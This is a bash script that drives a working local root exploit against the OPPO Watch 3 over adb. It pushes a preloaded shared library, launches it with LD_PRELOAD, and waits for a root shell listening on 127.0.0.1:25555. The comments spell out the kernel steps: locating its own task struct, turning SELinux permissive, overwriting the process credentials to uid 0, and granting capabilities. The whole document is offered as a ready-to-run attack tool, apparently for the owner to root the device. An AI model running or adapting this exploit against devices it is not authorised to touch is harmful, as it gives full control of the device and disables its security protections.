#!/usr/bin/env bash
# One command -> root shell on the OPPO Watch 3 (OWW212). Bootloader stays locked,
# nothing is flashed, no factory reset.
#
# What the fire does inside ONE boot (exploit/src/fops.c, the "UW" program):
#   read init_task.tasks   -> newest task node P -> task = P-0x460
#   read task+0x61c        -> real_cred / cred / comm (verify comm == toybox = us)
#   read the cred          -> verify uid/gid == our own 2000
#   store selinux_state=0  -> permissive
#   store cred uid..fsgid=0-> uid 0 for every thread of this process
#   store cred caps        -> CAP_SETUID|SETGID|SETPCAP|SYS_CHROOT|...
#   verify getuid()==0, re-ask whatever missed, then leave a detached
#   multi-connection root shell on 127.0.0.1:25555.
#
#   bash rootnow.sh [gsN]   # N selects the .so file name: a crash can poison a
#                           # name already used in /data/local/tmp, so switch to
#                           # the next one if the push complains.
export MSYS_NO_PATHCONV=1
export MSYS2_ARG_CONV_EXCL='*'
ADB=/c/platform-tools/adb.exe
DT=/data/local/tmp
ROOT=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212
SO='C:\Users\RLG\Documents\oppowatch2-root\GhostLock-OWW212\exploit\preload.so'
ARCH=$ROOT/captures
NAME=${1:-gs1}.so
ENVFIRE="GFSO=$DT/$NAME GHOSTLOCK_WS_TARGET=st GHOSTLOCK_STAT_UWALK=1 GHOSTLOCK_ATTEMPTS=32 GHOSTLOCK_WBASE=4 GHOSTLOCK_WALKSAFE=1"

$ADB shell "test -f $DT/fire3.sh || printf '#!/system/bin/sh\nexport LD_PRELOAD=\${GFSO:-/data/local/tmp/gs1.so}\nexec /system/bin/toybox true\n' > $DT/fire3.sh; chmod 755 $DT/fire3.sh" 2>/dev/null
if ! $ADB push "$SO" "$DT/$NAME" 2>&1 | tail -1 | grep -q pushed; then
  echo "[rootnow] push to $DT/$NAME failed -> try the next name: bash rootnow.sh gs2"
  exit 1
fi
$ADB shell "rm -f $DT/log_*.txt" 2>/dev/null
echo "[rootnow] firing with $NAME (left running on purpose: the fire panics the"
echo "         watch if it exits, so we keep it alive and reboot to reset)"
# Detach ON THE DEVICE (nohup + & inside the device shell): the fire must keep
# running after this host session/adb client goes away, otherwise its process
# gets SIGHUP'd and every later root operation (dd on the block devices) dies.
$ADB shell "nohup $ENVFIRE sh $DT/fire3.sh >/dev/null 2>&1 &" >/dev/null 2>&1
for i in $(seq 1 25); do
  sleep 3
  if $ADB shell "cat $DT/log_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r' | grep -aq 'UW-SHELL listening'; then
    break
  fi
done
sleep 1
L="$ARCH/rootnow-$(date +%m%d-%H%M%S).log"
$ADB shell "cat $DT/log_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r' > "$L"
grep -aE 'UW ours|UW-CHECK|UW-ROOT|UW-SHELL|exploit finished|UW give' "$L" | tail -8
if grep -aq 'UW-SHELL listening' "$L"; then
  echo "[rootnow] ROOT DAEMON UP -> attaching (log: $L)"
  cd "$ROOT" && python rootsh.py
else
  echo "[rootnow] this fire did not reach root; re-run: bash rootnow.sh ${NAME%.so}"
fi
